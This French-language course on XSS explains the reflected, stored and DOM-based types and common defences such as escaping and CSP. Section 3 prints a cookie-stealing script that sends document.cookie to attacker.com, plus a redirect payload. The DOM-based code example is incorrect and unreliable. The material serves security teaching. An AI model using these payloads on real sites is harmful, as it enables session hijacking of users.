### **Cours : Les failles XSS (Cross-Site Scripting)**

#### **Objectifs du cours :**
1. Comprendre ce qu'est une faille XSS et pourquoi elle représente une menace.
2. Découvrir les différents types de failles XSS.
3. Apprendre comment ces failles sont exploitées par les attaquants.
4. Explorer les meilleures pratiques pour prévenir les failles XSS.

---

### **1. Qu'est-ce que le XSS (Cross-Site Scripting) ?**

Le **Cross-Site Scripting (XSS)** est une vulnérabilité de sécurité très courante dans les applications web. Elle se produit lorsque des attaquants injectent du contenu malveillant (généralement du code JavaScript) dans des pages web consultées par d'autres utilisateurs. Si l'application web n'assainit pas correctement les données saisies par l'utilisateur, un attaquant peut exploiter cette faille pour manipuler le comportement de la page.

Le XSS permet à un attaquant d'exécuter des scripts malveillants dans le navigateur de la victime, ce qui peut conduire à des actions comme :
- **Vol de cookies** : Ce qui permet à un attaquant de prendre le contrôle d'une session.
- **Détournement de l'interface utilisateur** : Injection de contenu trompeur ou malveillant dans la page web.
- **Redirection vers des sites malveillants**.
- **Déclenchement d'actions malveillantes** sur le site en étant authentifié avec les droits de la victime.

---

### **2. Les différents types de XSS**

Il existe trois types principaux de failles XSS :

#### **2.1. XSS Réfléchi (Reflected XSS)**
- Dans les attaques XSS réfléchies, les données malveillantes sont renvoyées immédiatement par l'application web dans la réponse HTTP. Cela signifie que la charge utile malveillante (le script) est injectée via une requête HTTP (souvent dans les paramètres de l'URL ou des formulaires) et est directement exécutée dans le navigateur de la victime.
  
**Exemple :**
```http
http://victim-site.com/search?query=<script>alert('XSS')</script>
```
Dans cet exemple, si l'application retourne directement la valeur de `query` sans la filtrer correctement, le navigateur exécutera le code JavaScript malveillant.

#### **2.2. XSS Stocké (Stored XSS)**
- Le XSS stocké est l'un des types les plus dangereux de XSS, car la charge utile malveillante est **stockée dans la base de données** de l'application et exécutée chaque fois qu'un utilisateur affiche les données malveillantes. Cela peut arriver dans les sections de commentaires, les forums ou d'autres zones où des utilisateurs peuvent soumettre du contenu.
  
**Exemple :**
Un attaquant soumet un commentaire malveillant sur un site :
```html
<script>alert('XSS')</script>
```
Ce commentaire est ensuite affiché à tous les utilisateurs, et le script est exécuté chaque fois que quelqu'un consulte cette page.

#### **2.3. XSS basé sur le DOM (DOM-based XSS)**
- Les failles **DOM-based XSS** exploitent directement le **Document Object Model (DOM)** du navigateur. Ici, l'attaque se produit lorsque le JavaScript côté client manipule les entrées de manière incorrecte, et l'exécution du script malveillant se fait entièrement dans le navigateur sans impliquer directement le serveur web.
  
**Exemple :**
Si un site utilise un code JavaScript comme celui-ci :
```javascript
document.location = 'Bienvenue, ' + document.location.search;
```
Un attaquant pourrait manipuler l'URL comme suit :
```http
http://victim-site.com/welcome?<script>alert('XSS')</script>
```
Si le code JavaScript côté client n'est pas correctement échappé, le script sera exécuté dans le navigateur.

---

### **3. Exemples d'exploitation de failles XSS**

#### **3.1. Vol de cookies (session hijacking)**
Un attaquant peut voler le cookie de session d'un utilisateur via une faille XSS. Ce cookie peut ensuite être utilisé pour usurper l'identité de l'utilisateur.

**Exemple :**
```javascript
<script>
  var img = new Image();
  img.src = "http://attacker.com/steal_cookie.php?cookie=" + document.cookie;
</script>
```
Ici, le script envoie le cookie de session de la victime à l'attaquant via une requête HTTP.

#### **3.2. Redirection vers un site malveillant**
Un attaquant peut rediriger les utilisateurs vers un site malveillant en utilisant une vulnérabilité XSS.

**Exemple :**
```javascript
<script>window.location = 'http://attacker-site.com';</script>
```
Ce code redirige la victime vers un site contrôlé par l'attaquant, où elle peut être exposée à d'autres attaques.

---

### **4. Comment se protéger contre les failles XSS**

#### **4.1. Échapper les données utilisateur**
Assurez-vous de bien **échapper** toutes les données saisies par l'utilisateur avant de les inclure dans les réponses HTML. Cela signifie que chaque caractère potentiellement dangereux (comme `<`, `>`, `&`) doit être converti en une entité HTML inoffensive (comme `&lt;`, `&gt;`, `&amp;`).

#### **4.2. Validation des entrées utilisateur**
Validez et filtrez les entrées utilisateur dès que possible. Ne faites confiance à aucune donnée provenant de l'utilisateur sans la vérifier. Utilisez des **listes blanches** pour limiter les types de données acceptés (par exemple, limiter les entrées aux caractères alphanumériques uniquement pour certains champs).

#### **4.3. Content Security Policy (CSP)**
Le **CSP** est une en-tête HTTP qui permet aux développeurs de spécifier quelles ressources sont autorisées à être chargées et exécutées par le navigateur. En mettant en place une politique CSP restrictive, vous pouvez empêcher l'exécution de scripts malveillants provenant de sources non autorisées.

**Exemple d'en-tête CSP :**
```http
Content-Security-Policy: script-src 'self'; object-src 'none';
```
Cette règle autorise uniquement l'exécution de scripts provenant du même domaine (`self`) et interdit les objets externes.

#### **4.4. Utiliser des frameworks avec protection contre le XSS**
La plupart des frameworks modernes comme **React**, **Angular** ou **Django** disposent de protections intégrées contre les attaques XSS en échappant automatiquement les entrées utilisateur dans le DOM. Utiliser ces frameworks réduit le risque de XSS lorsqu'ils sont utilisés correctement.

#### **4.5. Sécuriser les API JavaScript**
Certaines fonctions JavaScript, comme `eval()` ou `innerHTML`, peuvent exécuter des scripts malveillants. Évitez d'utiliser ces fonctions dangereuses et préférez des alternatives plus sûres, comme `textContent` ou `setAttribute`.

---

### **5. Exercice pratique avec DVWA**
(Dans ce cours, on pourrait introduire des exercices pratiques basés sur DVWA, mais sans les détailler ici.)

---

### **6. Conclusion**

Le XSS est une vulnérabilité courante, mais extrêmement dangereuse, qui peut permettre à des attaquants d'exécuter des actions malveillantes dans le contexte du navigateur de la victime. La bonne nouvelle est que la plupart des attaques XSS peuvent être évitées en suivant quelques bonnes pratiques simples :
- Toujours valider et échapper les données d'entrée et de sortie.
- Utiliser des en-têtes de sécurité comme CSP.
- S'appuyer sur des frameworks qui offrent des protections intégrées.

La sécurité des applications web repose sur une gestion rigoureuse des entrées utilisateur et la mise en place de mécanismes de défense à plusieurs niveaux.

---

### **Ressources supplémentaires :**
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html)
- [Mozilla Developer Network (MDN) – Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
- [PortSwigger – What is Cross-site Scripting (XSS)?](https://portswigger.net/web-security/cross-site-scripting)
